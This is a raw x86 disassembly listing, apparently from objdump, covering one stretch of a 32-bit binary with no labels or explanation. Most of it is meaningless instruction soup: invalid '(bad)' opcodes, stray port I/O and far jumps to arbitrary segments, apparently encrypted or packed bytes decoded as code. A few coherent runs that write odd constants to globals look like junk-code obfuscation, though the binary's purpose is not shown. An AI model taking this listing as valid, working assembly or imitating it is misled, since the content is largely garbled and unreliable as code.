  40397b:	fcmove st,st(4)
  40397d:	ja     0x4039ee
  40397f:	inc    BYTE PTR [esi]
  403981:	aas    
  403982:	lea    ebx,[ebp+0x5579d762]
  403988:	mov    edi,0xd1355e06
  40398d:	xchg   ebp,eax
  40398e:	fst    DWORD PTR [ebp-0x40caddd7]
  403994:	mov    bh,0x7d
  403996:	sub    ch,bh
  403998:	into   
  403999:	pop    es
  40399a:	inc    ebx
  40399b:	pop    ebx
  40399c:	rol    BYTE PTR [ebx],cl
  40399e:	mov    edi,0xab2fb204
  4039a3:	aaa    
  4039a4:	add    edx,0x1b
  4039a7:	jb     0x4039c3
  4039a9:	adc    esp,0x40
  4039ac:	ret    
  4039ad:	(bad)  [edx]
  4039af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b0:	dec    ebx
  4039b1:	add    ah,BYTE PTR [ebp-0x46]
  4039b4:	bound  ebp,QWORD PTR [eax+0x19]
  4039b7:	dec    esi
  4039b8:	in     eax,dx
  4039b9:	test   eax,0xcfb51679
  4039be:	pop    esi
  4039bf:	sub    al,0x1
  4039c1:	mov    edx,0x1512e3a6
  4039c6:	shr    ch,cl
  4039c8:	out    dx,eax
  4039c9:	xchg   esp,eax
  4039ca:	xchg   BYTE PTR [edi],bl
  4039cc:	fmul   DWORD PTR [ebx]
  4039ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039cf:	xchg   edi,eax
  4039d0:	leave  
  4039d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039d2:	dec    esp
  4039d3:	fwait
  4039d4:	sbb    DWORD PTR [edi],ecx
  4039d6:	sbb    DWORD PTR [edi+0x229c6404],ecx
  4039dc:	jo     0x403a48
  4039de:	pop    ebx
  4039df:	std    
  4039e0:	aam    0x35
  4039e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039e3:	aas    
  4039e4:	xchg   ebx,eax
  4039e5:	iret   
  4039e6:	inc    esi
  4039e7:	icebp  
  4039e8:	push   esp
  4039e9:	push   es
  4039ea:	rcl    DWORD PTR [edi-0x5b],cl
  4039ed:	xor    al,0xd6
  4039ef:	mov    al,ds:0x3ab850bd
  4039f4:	gs sti 
  4039f6:	pop    ebp
  4039f7:	jb     0x403a6b
  4039f9:	lea    esi,[eax]
  4039fb:	pop    eax
  4039fc:	in     eax,0x75
  4039fe:	sub    cl,BYTE PTR [edx]
  403a00:	mov    al,0x8c
  403a02:	popa   
  403a03:	mov    edi,0xfa425365
  403a08:	sbb    eax,0xf7a578
  403a0d:	aam    0xd2
  403a0f:	push   ss
  403a10:	xlat   BYTE PTR ds:[bx]
  403a12:	sahf   
  403a13:	leave  
  403a14:	jp     0x4039fb
  403a16:	push   cs
  403a17:	int    0xf
  403a19:	aad    0x6d
  403a1b:	pop    ebp
  403a1c:	(bad)  
  403a1e:	out    0xe7,al
  403a20:	idiv   BYTE PTR [edx+0x69]
  403a23:	out    dx,al
  403a24:	xchg   edx,eax
  403a25:	push   0x75
  403a27:	jb     0x403a73
  403a29:	inc    ebp
  403a2a:	push   esp
  403a2b:	int3   
  403a2c:	int    0x2c
  403a2e:	push   eax
  403a2f:	xchg   DWORD PTR [esi],eax
  403a31:	sub    eax,0xdabcbeb3
  403a36:	not    BYTE PTR [ebx-0x1097a7be]
  403a3c:	adc    al,cl
  403a3e:	xor    DWORD PTR [ecx+0x68],ebp
  403a41:	retf   0x973c
  403a44:	aas    
  403a45:	les    edx,FWORD PTR [ecx+0x28]
  403a48:	mov    ah,0xef
  403a4a:	add    BYTE PTR [edi-0x4afa1ca0],0xe2
  403a51:	mov    al,0x77
  403a53:	lea    edi,[esi-0x3a14217]
  403a59:	jmp    0xa395:0x5905d282
  403a60:	(bad)  
  403a61:	add    BYTE PTR [edx+0x4e81a5ee],0xdc
  403a68:	dec    ebp
  403a69:	jg     0x403a36
  403a6b:	push   ecx
  403a6c:	hlt    
  403a6d:	xor    eax,0x8293f3d8
  403a72:	push   cs
  403a73:	and    cl,BYTE PTR [ebx+esi*2]
  403a76:	repnz xor ecx,esp
  403a79:	inc    eax
  403a7a:	adc    DWORD PTR [esi-0x7deade25],0x5c
  403a81:	mov    cl,0xe7
  403a83:	add    ebp,ebp
  403a85:	jge    0x403a8d
  403a87:	cli    
  403a88:	mov    ebp,0x73b40700
  403a8d:	sub    esi,esp
  403a8f:	out    dx,al
  403a90:	sbb    BYTE PTR [edx-0xab91b1b],0xb4
  403a97:	mov    eax,es
  403a99:	dec    ecx
  403a9a:	jmp    0x403a7d
  403a9c:	(bad)  
  403a9d:	xor    dx,WORD PTR [edi+0x36]
  403aa1:	xor    al,0xde
  403aa3:	fisubr DWORD PTR [ebp+edx*4+0x3d]
  403aa7:	loopne 0x403a76
  403aa9:	in     eax,0x33
  403aab:	lods   al,BYTE PTR ds:[esi]
  403aac:	sub    eax,0xddff3ffe
  403ab1:	mov    dl,0x1e
  403ab3:	inc    edi
  403ab4:	rcl    DWORD PTR [edi+0x59],cl
  403ab7:	pop    esp
  403ab8:	push   esi
  403ab9:	and    al,0x6b
  403abb:	xchg   ebp,eax
  403abc:	(bad)  
  403abd:	out    dx,eax
  403abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403abf:	outs   dx,BYTE PTR ds:[esi]
  403ac0:	mov    edi,0x9a53f421
  403ac5:	imul   ebx,DWORD PTR [edx+0x4f993f8],0xfffffff6
  403acc:	xor    DWORD PTR [eax-0x3f],ebp
  403acf:	jmp    0x403a8a
  403ad1:	sbb    BYTE PTR [ecx],0x19
  403ad4:	xchg   BYTE PTR [edi+0x39],dl
  403ad7:	mov    edi,0x5aaa48dd
  403adc:	mov    al,0x9f
  403ade:	push   ss
  403adf:	neg    BYTE PTR [esi+eax*4]
  403ae2:	icebp  
  403ae3:	jae    0x403a9b
  403ae5:	js     0x403b5b
  403ae7:	pop    ecx
  403ae8:	out    dx,al
  403ae9:	pusha  
  403aea:	imul   ecx,DWORD PTR [edi+0x5c5b1403],0xfff458a
  403af4:	mov    bh,0xd
  403af6:	imul   esp,esi,0x42
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fcf6
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e0a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fc7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fc75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x5b2e7997],esi
  403b3e:	add    ebp,0x1e
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x670707d
  403b48:	loope  0x403acc
  403b4a:	sub    ch,BYTE PTR [ecx]
  403b4c:	and    eax,0x64e33bf2
  403b51:	nop
  403b52:	dec    ebx
  403b53:	xchg   edi,eax
  403b54:	arpl   WORD PTR [edx],ax
  403b56:	mov    bh,0xcc
  403b58:	shr    ecx,1
  403b5a:	inc    ebp
  403b5b:	cwde   
  403b5c:	add    bl,BYTE PTR [ecx+0x3874e545]
  403b62:	loop   0x403b71
  403b64:	cld    
  403b65:	adc    DWORD PTR [eax-0x4d],edi
  403b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b69:	call   0xbfbf:0xf20602cc
  403b70:	das    
  403b71:	out    dx,eax
  403b72:	pop    edi
  403b73:	xor    al,0xd8
  403b75:	aam    0xff
  403b77:	mov    al,ds:0xe3787ea7
  403b7c:	dec    ebx
  403b7d:	test   eax,0xbb58e811
  403b82:	adc    dh,BYTE PTR [ebp-0x5c59d15]
  403b88:	add    BYTE PTR [ebp+0x4265dd7a],al
  403b8e:	mov    ah,0xac
  403b90:	test   ebp,0xed90fb71
  403b96:	aad    0xbf
  403b98:	std    
  403b99:	xchg   edi,eax
  403b9a:	sub    DWORD PTR [ebx-0x77],0x413ff26c
  403ba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ba2:	rol    DWORD PTR [esi-0x4368bc83],cl
  403ba8:	inc    esp
  403ba9:	pop    ss
  403baa:	inc    edi
  403bab:	inc    esi
  403bac:	lock jbe 0x403b7a
  403baf:	div    cl
  403bb1:	jne    0x403b6b
  403bb3:	repz jge 0x403b71
  403bb6:	sbb    al,0xc
  403bb8:	and    BYTE PTR [ecx+0xe80a958],0x5e
  403bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc0:	cmp    eax,0x87c1b496
  403bc5:	inc    esi
  403bc6:	pop    esi
  403bc7:	push   cs
  403bc8:	xchg   esp,eax
  403bc9:	das    
  403bca:	xchg   esp,eax
  403bcb:	and    ebp,DWORD PTR [edx+esi*4]
  403bce:	(bad)  
  403bcf:	push   0xffffffd3
  403bd1:	frstor [ebx+0x6d]
  403bd4:	out    dx,eax
  403bd5:	pop    es
  403bd6:	and    eax,0x28c51b6f
  403bdb:	adc    ebp,DWORD PTR [edx]
  403bdd:	popf   
  403bde:	push   eax
  403bdf:	mov    edx,DWORD PTR [esp+ebx*4-0x6e]
  403be3:	les    esp,FWORD PTR [esi-0x44]
  403be6:	dec    esi
  403be7:	mov    edi,0x695ae45d
  403bec:	push   ecx
  403bed:	mov    ecx,0x2f3bec3d
  403bf2:	in     eax,dx
  403bf3:	push   edx
  403bf4:	cmp    al,0xee
  403bf6:	je     0x403c3f
  403bf8:	ss pop edi
  403bfa:	jb     0x403c5d
  403bfc:	sbb    al,BYTE PTR [esi+0x15]
  403bff:	stos   BYTE PTR es:[edi],al
  403c00:	inc    ebx
  403c01:	repz test dl,ch
  403c04:	mul    BYTE PTR [edx]
  403c06:	mov    dl,0xd7
  403c08:	dec    eax
  403c09:	mov    esi,0x5c053e15
  403c0e:	or     ebx,DWORD PTR [edi-0x1138d10a]
  403c14:	shl    DWORD PTR [ebx+0x36b92d95],0x27
  403c1b:	adc    eax,0x7845135a
  403c20:	stc    
  403c21:	adc    DWORD PTR [esi+0x2bfa6adf],0x466ed4e4
  403c2b:	mov    dl,0xeb
  403c2d:	test   al,0xca
  403c2f:	ins    BYTE PTR es:[edi],dx
  403c30:	fild   DWORD PTR [ebp-0x64]
  403c33:	fs int 0xcf
  403c36:	ja     0x403c19
  403c38:	jae    0x403c00
  403c3a:	fst    DWORD PTR [ebp-0x3d]
  403c3d:	mov    ch,0xdf
  403c3f:	test   eax,0x861accf1
  403c44:	ret    0x298f
  403c47:	into   
  403c48:	or     al,0xa3
  403c4a:	pusha  
  403c4b:	jp     0x403be1
  403c4d:	jecxz  0x403c8b
  403c4f:	(bad)  
  403c50:	ds mov dl,0x5d
  403c53:	adc    ebp,eax
  403c55:	(bad)
  403c58:	ins    BYTE PTR es:[di],dx
  403c5a:	js     0x403c9d
  403c5c:	mov    eax,0xc9c1076
  403c61:	and    ebx,DWORD PTR [eax]
  403c63:	stos   DWORD PTR es:[edi],eax
  403c64:	mov    edx,0x952198c3
  403c69:	into   
  403c6a:	pop    edx
  403c6b:	test   DWORD PTR [ecx+0x60abccf3],0x2f94ea84
  403c75:	fs clc 
  403c77:	mov    edx,0x64757b73
  403c7c:	into   
  403c7d:	repz pop edx
  403c7f:	cmp    DWORD PTR [eax+0x48],ecx
  403c82:	popf   
  403c83:	mul    BYTE PTR [ebp-0x7bde4236]
  403c89:	shl    DWORD PTR [edx-0x6f],0xe5
  403c8d:	shl    ebp,0x3
  403c90:	and    DWORD PTR [ecx-0x2a2024aa],eax
  403c96:	dec    esi
  403c97:	cld    
  403c98:	test   dh,cl
  403c9a:	call   0x12fd5611
  403c9f:	ret    
  403ca0:	xchg   esi,eax
  403ca1:	das    
  403ca2:	dec    eax
  403ca3:	mov    ebp,0x87f0754
  403ca8:	cli    
  403ca9:	mov    bh,0xd5
  403cab:	mov    ds:0xa17dc9a6,eax
  403cb0:	std    
  403cb1:	jno    0x403d02
  403cb3:	je     0x403cd1
  403cb5:	inc    ebx
  403cb6:	mov    dh,0x48
  403cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb9:	dec    esi
  403cba:	sub    BYTE PTR [ecx-0x25089],0xfe
  403cc1:	sbb    al,0xd6
  403cc3:	repnz ins BYTE PTR es:[edi],dx
  403cc5:	stos   DWORD PTR es:[edi],eax
  403cc6:	fadd   QWORD PTR [ecx]
  403cc8:	mov    bh,0x7f
  403cca:	jne    0x403c9e
  403ccc:	(bad)  
  403ccd:	jecxz  0x403c6e
  403ccf:	je     0x403d3a
  403cd1:	outs   dx,DWORD PTR ds:[esi]
  403cd2:	cdq    
  403cd3:	test   BYTE PTR [edi+0x67],ch
  403cd6:	jo     0x403cb2
  403cd8:	inc    esp
  403cd9:	mov    fs,esp
  403cdb:	in     eax,dx
  403cdc:	jle    0x403d29
  403cde:	sub    dh,bh
  403ce0:	sti    
  403ce1:	ror    DWORD PTR [ecx],1
  403ce3:	sbb    ch,BYTE PTR [eax+0x4c105e16]
  403ce9:	push   ebx
  403cea:	xchg   ebx,eax
  403ceb:	sub    al,0x18
  403ced:	sbb    eax,0xeb1ed8d
  403cf2:	xor    bh,al
  403cf4:	lea    dx,[ecx-0x1c]
  403cf8:	stos   DWORD PTR es:[edi],eax
  403cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cfa:	cs mov bh,0x15
  403cfd:	jb     0x403cd7
  403cff:	xchg   DWORD PTR [edi+0xdd906d4],esi
  403d05:	dec    eax
  403d06:	xor    al,0x62
  403d08:	jl     0x403d6a
  403d0a:	pop    esi
  403d0b:	mov    ecx,0x4a404c94
  403d10:	push   ebp
  403d11:	data16 aam 0x86
  403d14:	test   DWORD PTR [ebp+0x33],esp
  403d17:	out    dx,al
  403d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d19:	mov    BYTE PTR fs:[eax+0x1],ch
  403d1d:	sub    al,0x5
  403d1f:	stos   DWORD PTR es:[edi],eax
  403d20:	mov    ds:0x1d290cb0,eax
  403d25:	xor    eax,0x54ac0e0c
  403d2a:	dec    esi
  403d2b:	push   ss
  403d2c:	hlt    
  403d2d:	mov    esi,0xc5b59b6a
  403d32:	cmp    eax,0x3a2dc76a
  403d37:	and    eax,0x1c2e6922
  403d3c:	clc    
  403d3d:	out    dx,al
  403d3e:	aam    0xb6
  403d40:	mov    ebx,0xc7b7fc6a
  403d45:	inc    edi
  403d46:	pop    es
  403d47:	mov    ah,0x3d
  403d49:	dec    eax
  403d4a:	push   esi
  403d4b:	icebp  
  403d4c:	stos   BYTE PTR es:[edi],al
  403d4d:	sub    esp,esi
  403d4f:	je     0x403cd2
  403d51:	mov    eax,ds:0xc878da71
  403d57:	adc    al,0xb
  403d59:	leave  
  403d5a:	aas    
  403d5b:	push   eax
  403d5c:	xchg   edi,eax
  403d5d:	loope  0x403d9e
  403d5f:	rol    BYTE PTR [ebx-0x52148acc],cl
  403d65:	mov    eax,ds:0xced1a44f
  403d6a:	pop    esp
  403d6b:	test   DWORD PTR [eax-0x34],ecx
  403d6e:	push   esp
  403d6f:	cmp    dl,BYTE PTR [ebx-0x736ec5c8]
  403d75:	(bad)  
  403d77:	xor    eax,0x185dbead
  403d7c:	fsub   QWORD PTR [esi]
  403d7e:	pop    es
  403d7f:	lock lahf 
  403d81:	cli    
  403d82:	mov    ds:0x842230ae,eax
  403d87:	mov    eax,0xfcb58e3e
  403d8c:	mov    WORD PTR [esi-0x63],gs
  403d8f:	pop    DWORD PTR [eax]
  403d91:	ins    DWORD PTR es:[edi],dx
  403d92:	sub    DWORD PTR [ebp-0x1daec3ee],eax
  403d98:	mov    esp,0xf8a52db
  403d9d:	aas    
  403d9e:	lods   eax,DWORD PTR ds:[esi]
  403d9f:	adc    DWORD PTR [ebp-0x39],ebp
  403da2:	xchg   edx,eax
  403da3:	mov    esp,0x8a40ce7c
  403da8:	aaa    
  403da9:	arpl   WORD PTR [edi-0x470ae026],sp
  403daf:	or     cl,ah
  403db1:	sub    bl,BYTE PTR [ecx]
  403db3:	out    0x45,eax
  403db5:	mov    al,0xe6
  403db7:	cwde   
  403db8:	mov    BYTE PTR [ecx-0x11],bh
  403dbb:	jno    0x403dbe
  403dbd:	cmp    al,0xde
  403dbf:	cmp    BYTE PTR [edx+0x4467e10f],ch
  403dc5:	or     DWORD PTR [ebx+0x40e6e77c],esp
  403dcb:	push   eax
  403dcc:	inc    ebp
  403dcd:	sbb    DWORD PTR [esi-0xb],edx
  403dd0:	push   0xdaf88875
  403dd5:	mov    ah,0x96
  403dd7:	sbb    DWORD PTR [ecx],ebp
  403dd9:	out    0xa0,al
  403ddb:	xor    BYTE PTR [ecx+0xb783f9a],0x5c
  403de2:	stos   DWORD PTR es:[edi],eax
  403de3:	push   edx
  403de4:	dec    ebp
  403de5:	jo     0x403e66
  403de7:	dec    eax
  403de8:	unpckhps xmm2,XMMWORD PTR [eax]
  403deb:	mov    esi,0x4c529c33
  403df0:	aam    0x5f
  403df2:	sub    ch,BYTE PTR [edi+ebx*1]
  403df5:	mov    esp,0xab98036
  403dfa:	dec    edx
  403dfb:	adc    al,0xe7
  403dfd:	inc    eax
  403dfe:	mov    cl,0xd4
  403e00:	sbb    edi,ebp
  403e02:	ficomp DWORD PTR [esi+0x52]
  403e05:	or     DWORD PTR [ebx-0x33e5c052],edx
  403e0b:	leave  
  403e0c:	pop    es
  403e0d:	mov    eax,ds:0xa669eae9
  403e12:	das    
  403e13:	aas    
  403e14:	mov    ebp,0x3d393021
  403e19:	test   BYTE PTR [edx-0x57a73b1a],bh
  403e1f:	xchg   edi,eax
  403e20:	repz add eax,DWORD PTR [ecx-0x1f]
  403e24:	jl     0x403dfc
  403e26:	mov    al,0xed
  403e28:	sar    ebx,cl
  403e2a:	xor    ecx,DWORD PTR [edx-0x4b]
  403e2d:	xchg   ebx,eax
  403e2e:	push   cs
  403e2f:	outs   dx,DWORD PTR ds:[esi]
  403e30:	lods   eax,DWORD PTR ds:[esi]
  403e31:	mov    ds:0xbb5767e1,al
  403e36:	out    dx,al
  403e37:	clc    
  403e38:	mov    bh,BYTE PTR [ecx+ebx*8-0x32]
  403e3c:	push   ecx
  403e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3e:	stos   DWORD PTR es:[edi],eax
  403e3f:	jmp    0x6680:0x41eb02f5
  403e46:	ja     0x403e28
  403e48:	jbe    0x403e5a
  403e4a:	mov    ebp,0x5e9ab158
  403e4f:	push   0x8
  403e51:	ins    DWORD PTR es:[edi],dx
  403e52:	xchg   esp,eax
  403e53:	xchg   edi,eax
  403e54:	nop
  403e55:	cmp    eax,0xebdc22b2
  403e5a:	xchg   esi,eax
  403e5b:	push   eax
  403e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e5d:	sub    eax,0x3c4e1425
  403e62:	rol    ebx,0xbd
  403e65:	mov    DWORD PTR ss:[edi-0x17],esp
  403e69:	push   ebp
  403e6a:	shl    BYTE PTR [eax+edi*8-0x55],cl
  403e6e:	adc    ah,BYTE PTR [esi-0x377b2a73]
  403e74:	(bad)  
  403e75:	mov    edx,0xd2e2261d
  403e7a:	add    BYTE PTR [ebp-0x420f80cd],al
  403e80:	xchg   esi,eax
  403e81:	push   ebp
  403e82:	cmp    dh,BYTE PTR [ebx]
  403e84:	xchg   edi,eax
  403e85:	inc    ebx
  403e86:	lea    ebp,[edi+0x45c70eae]
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e09c
  403ea2:	adc    DWORD PTR ds:0x42e68f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fcf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fc85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e66f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0xc6e41c35
  403eec:	lahf   
  403eed:	aad    0x82
  403eef:	sbb    esi,DWORD PTR [eax+0x70]
  403ef2:	cmp    eax,0x9670707d
  403ef7:	cmp    ah,bh
  403ef9:	push   0xa472902d
  403efe:	out    dx,al
  403eff:	sbb    al,0xa0
  403f01:	int3   
  403f02:	repnz jmp 0x6549:0x63b45dc8
  403f0a:	dec    ebx
  403f0b:	mov    ?,WORD PTR [esi-0x50]
  403f0e:	adc    cl,BYTE PTR [ebx]
  403f10:	cwde   
  403f11:	cld    
  403f12:	call   0xe31fa5d1
  403f17:	test   eax,0x4827ec17
  403f1c:	sbb    edi,edx
  403f1e:	(bad)  
  403f1f:	sbb    esi,DWORD PTR [ecx]
  403f21:	dec    ecx
  403f22:	retf   
  403f23:	cli    
  403f24:	loope  0x403f28
  403f26:	mov    ds:0x2524dc08,eax
  403f2b:	out    0x22,eax
  403f2d:	xchg   edi,eax
  403f2e:	add    al,0xb2
  403f30:	sub    eax,DWORD PTR [edx+0x20a860f9]
  403f36:	aad    0x85
  403f38:	nop
  403f39:	push   ds
  403f3a:	pop    esp
  403f3b:	inc    edx
  403f3c:	mov    edx,0x8144122e
  403f41:	mov    edi,cs
  403f43:	sbb    bl,BYTE PTR ds:0xf3567846
  403f49:	jg     0x403f78
  403f4b:	add    BYTE PTR [esi+ebp*2],dl
  403f4e:	jno    0x403f5f
  403f50:	jmp    0x71e37954
  403f55:	mov    ecx,0xecb10d8e
  403f5a:	shl    DWORD PTR [edi-0x5b395a0e],1
  403f60:	mov    ds:0x84a5f614,eax
  403f65:	cdq    
  403f66:	pop    eax
  403f67:	dec    eax
  403f68:	dec    edi
  403f69:	pop    es
  403f6a:	add    ah,BYTE PTR [esi-0x70]
  403f6d:	sbb    DWORD PTR [edx+0x70bcfff],esp
  403f73:	sbb    eax,0xd2daa4bd
  403f78:	lock scas al,BYTE PTR es:[edi]
  403f7a:	jae    0x403fa9
  403f7c:	or     al,0x2f
  403f7e:	mov    esi,0x41cc2251
  403f83:	aam    0xf2
  403f85:	push   0x37581f3d
  403f8a:	ret    0xcfcf
  403f8d:	sub    al,0x98
  403f90:	mov    ebx,0xb978fd9b
  403f95:	inc    edi
  403f96:	mov    DWORD PTR [edi-0x47],esp
  403f99:	mov    ds:0x5a14acdd,eax
  403f9e:	and    al,0xf2
  403fa0:	js     0x403f89
  403fa2:	sti    
  403fa3:	icebp  
  403fa4:	push   ebp
  403fa5:	mov    esi,0x9dc533bc
  403faa:	xor    eax,0x272e7a0f
  403faf:	jbe    0x403f80
  403fb1:	xchg   ecx,eax
  403fb2:	xchg   ebp,eax
  403fb3:	lahf   
  403fb4:	inc    eax
  403fb5:	pop    ds
  403fb6:	arpl   WORD PTR [edi+0x69e6377f],ax
  403fbc:	pushf  
  403fbd:	xchg   ecx,eax
  403fbe:	jge    0x403f44
  403fc0:	das    
  403fc1:	out    dx,eax
  403fc2:	sbb    BYTE PTR [ebx-0x5d3a1e48],0xc
  403fc9:	aad    0x1d
  403fcb:	xchg   esi,eax
  403fcc:	shl    BYTE PTR ds:0x6335f520,cl
  403fd2:	shl    BYTE PTR [esi],0x30
  403fd5:	push   0xfd0dbd61
  403fda:	ins    BYTE PTR es:[edi],dx
  403fdb:	adc    ecx,DWORD PTR [ebp+0x11]
  403fde:	cmp    bl,BYTE PTR [eax-0x2f]
  403fe1:	in     al,0xe8
  403fe3:	jecxz  0x403f94
  403fe5:	std    
  403fe6:	bound  edi,QWORD PTR [esi]
  403fe8:	jle    0x403fb3
  403fea:	fbld   TBYTE PTR [eax+eiz*2]
  403fed:	mov    dh,0x71
  403fef:	jnp    0x40406c
  403ff1:	jbe    0x404051
  403ff3:	out    dx,eax
  403ff4:	fcomp  DWORD PTR [edx]
  403ff6:	(bad)  
  403ff8:	cwde   
  403ff9:	test   DWORD PTR [esi+0x75f7973d],esp
  403fff:	inc    eax
  404000:	loopne 0x403f84
  404002:	xor    ch,BYTE PTR [eax]
  404004:	xor    DWORD PTR [edi+0x18],0xa1dec805
  40400b:	(bad)  
  40400c:	jmp    FWORD PTR [ebx+edi*4-0x63f4119b]
  404013:	pushf  
  404014:	jb     0x404067
  404016:	mov    eax,ds:0x800319c3
  40401b:	jmp    0x4635:0xc2c3027c
  404022:	mov    DWORD PTR [ebx],edi
  404024:	les    edi,FWORD PTR [eax-0x5facc628]
  40402a:	cmp    al,cl
  40402c:	jp     0x404036
  40402e:	mov    ecx,0x5b695bf8
  404033:	push   ecx
  404034:	xor    ebx,edi
  404036:	cmp    al,0x99
  404038:	dec    eax
  404039:	ror    esi,0xe5
  40403c:	cmp    DWORD PTR [ecx+eax*2-0x2ea63629],0x8b9b2f6e
  404047:	and    esi,DWORD PTR [ebx-0x8858cee]
  40404d:	jae    0x404041
  40404f:	dec    ebp
  404050:	jmp    0x40405a
  404052:	or     al,0x23
  404054:	mov    edx,ebp
  404056:	daa    
  404057:	pop    esp
  404058:	cwde   
  404059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40405a:	mov    cl,0x60
  40405c:	mov    esi,DWORD PTR [eax+0x77a25ef9]
  404062:	jbe    0x4040cd
  404064:	cmp    al,0xd9
  404066:	cmp    al,0xc5
  404068:	mov    bl,0x21
  40406a:	fs out dx,al
  40406c:	xchg   BYTE PTR [edx+ebp*2+0x74],cl
  404070:	add    esp,DWORD PTR [ecx]
  404072:	xchg   edx,eax
  404073:	out    0x70,al
  404075:	lods   al,BYTE PTR es:[esi]
  404077:	fist   WORD PTR [ebx]
  404079:	cli    
  40407a:	lds    edi,FWORD PTR [esi+0x469998c2]
  404080:	mov    edi,0xec065e24
  404085:	pushf  
  404086:	aam    0xa
  404088:	xor    DWORD PTR [edx-0x12],edi
  40408b:	lds    eax,FWORD PTR [edi]
  40408d:	rol    BYTE PTR [ebx],cl
  40408f:	jmp    0xb466:0x80a6def1
  404096:	aaa    
  404097:	ret    0xba62
  40409a:	ficomp WORD PTR [esi-0x78]
  40409d:	inc    esi
  40409e:	les    ecx,FWORD PTR ds:0x440ef820
  4040a4:	xor    dl,BYTE PTR [esi]
  4040a6:	out    dx,al
  4040a7:	mov    ?,WORD PTR [edx-0x3f]
  4040aa:	add    ah,ah
  4040ac:	cli    
  4040ad:	jge    0x4040f4
  4040af:	punpcklwd mm2,DWORD PTR [ecx]
  4040b2:	test   DWORD PTR [edi+0x6],esi
  4040b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040b6:	lahf   
  4040b7:	out    0x99,al
  4040b9:	(bad)  
  4040ba:	imul   BYTE PTR [ebx]
  4040bc:	out    dx,eax
  4040bd:	mov    al,0x3f
  4040bf:	ja     0x404128
  4040c1:	ret    0x7a06
  4040c4:	outs   dx,DWORD PTR ds:[esi]
  4040c5:	inc    esi
  4040c6:	adc    edi,DWORD PTR [ebx+0x9]
  4040c9:	imul   ebx,DWORD PTR [edx-0x68],0xed45b997
  4040d0:	(bad)  
  4040d1:	retf   0xa1aa
  4040d4:	ret    
  4040d5:	ins    DWORD PTR es:[edi],dx
  4040d6:	(bad)  
  4040d7:	(bad)  
  4040d9:	arpl   WORD PTR [edi+0x4a6e0382],bx
  4040df:	mov    al,0xad
  4040e1:	cmp    ch,BYTE PTR [ecx]
  4040e3:	mov    ch,0x4e
  4040e5:	inc    ebx
  4040e6:	adc    al,0x5c
  4040e8:	jecxz  0x404092
  4040ea:	test   DWORD PTR [edx-0x143c28d6],0x2758507d
  4040f4:	shl    DWORD PTR gs:[edx-0x1617a590],cl
  4040fb:	and    al,BYTE PTR [esi+ebp*4-0x6187163b]
  404102:	cmp    eax,esi
  404104:	mov    eax,ds:0x2c4c5383
  404109:	sbb    eax,0x1129b321
  40410e:	cmp    ebp,DWORD PTR [edx+0x15]
  404111:	push   edi
  404112:	fidiv  DWORD PTR ds:0xc575c3fa
  404118:	xor    DWORD PTR [ecx],0xfffffff2
  40411b:	ja     0x404187
  40411d:	cmp    DWORD PTR [edx+ecx*1+0x7962b928],eax
  404124:	aaa    
  404125:	iret   
  404126:	inc    edi
  404127:	pop    edi
  404128:	sub    al,0x97
  40412a:	add    bh,BYTE PTR [ecx-0x4a1fa02b]
  404130:	push   edi
  404131:	ins    DWORD PTR es:[edi],dx
  404132:	dec    eax
  404133:	dec    eax
  404134:	icebp  
  404135:	add    al,0x2e
  404137:	push   edx
  404138:	pop    ecx
  404139:	lahf   
  40413a:	in     al,0x66
  40413c:	jb     0x40419a
  40413e:	ja     0x404131
  404140:	je     0x4041ac
  404142:	stc    
  404143:	push   ds
  404144:	pop    esp
  404145:	in     al,dx
  404146:	mov    bh,0x9d
  404148:	sbb    BYTE PTR fs:[esi-0x73],dl
  40414c:	mov    ds:0x9f878dfa,eax
  404151:	clc    
  404152:	cmp    BYTE PTR [ebx-0x8f6a3b9],ah
  404158:	xchg   ebp,eax
  404159:	addr16 cmc 
  40415b:	dec    DWORD PTR [edi]
  40415d:	cmp    BYTE PTR [esi+0x348c491],ch
  404163:	mov    BYTE PTR [esi-0x6c],dh
  404166:	sub    BYTE PTR [ebp+0x49f6283],bl
  40416c:	or     al,0xea
